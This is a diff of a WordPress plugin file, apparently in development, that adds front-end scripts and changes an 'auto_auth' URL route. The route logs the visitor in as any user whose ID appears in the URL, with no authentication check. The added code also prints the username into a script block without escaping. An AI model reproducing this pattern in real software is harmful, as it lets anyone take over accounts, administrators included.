@@ -27,14 +27,18 @@ define('SOC_JS', plugin_dir_url(__FILE__) . 'front/js/');
 
 // load css&js
 add_action( 'wp_enqueue_scripts', function(){
+    wp_enqueue_script('popper', SOC_JS.'popper.min.js' , array('jquery', 'media-upload'));
+    wp_enqueue_script('bootstrap', SOC_JS.'bootstrap.min.js' , array('jquery'));
+
     wp_enqueue_script('soc-scripts', SOC_JS.'scripts.js' , '1.1',array('jquery'));
     wp_localize_script( 'soc-scripts', 'SOCAjax', array(
         'ajaxurl' => admin_url( 'admin-ajax.php' ),
         'security' => wp_create_nonce( 'vovJ0hYrMya1ywMG' ),
         'REQUEST_TIMEOUT' => 10000,
     ));
-//    wp_enqueue_media();
-    //wp_enqueue_style( 'soc-styles', SOC_CSS . 'styles.css','1.1');
+    wp_enqueue_media();
+    wp_enqueue_style( 'bootstrap', SOC_CSS . 'bootstrap.min.css');
+    wp_enqueue_style( 'soc-styles', SOC_CSS . 'styles.css','1.1');
 });
 
 
@@ -52,19 +56,36 @@ if(is_admin()){
 add_action('init', function (){
     add_rewrite_rule(
         'auto_auth/([^/]+)/?$',
-        'index.php?pagename=auto_auth&s=$matches[1]',
+        'index.php?pagename=auto_auth&uid=$matches[1]',
         'top'
     );
 });
 add_action('template_redirect', function(){
     if ( get_query_var('pagename') === 'auto_auth' ) {
-        $user = get_user_by('ID',get_query_var('s'));
+        $user = get_user_by('ID',get_query_var('uid'));
 
         wp_clear_auth_cookie();
         wp_set_current_user( $user->ID, $user->user_login );
         wp_set_auth_cookie( $user->ID );
         sleep(1);
-        wp_safe_redirect('http://localhost/wordpress/');
+
+        ?>
+        <script type="application/ld+json" id="json_content">
+            {
+                "user_name" : "<?= $user->user_login ?>"
+            }
+        </script>
+        <script type="text/javascript">
+            let localVars = JSON.parse(document.getElementById("json_content").innerHTML,false);
+            alert(` خوش آمدید ${localVars.user_name}`);
+
+            window.location.href = 'http://localhost/wordpress/';
+        </script>
+        <?php
     }
+});
+add_filter( 'query_vars', function ($vars){
+    $vars[] = 'uid';
+    return $vars;
 });
 
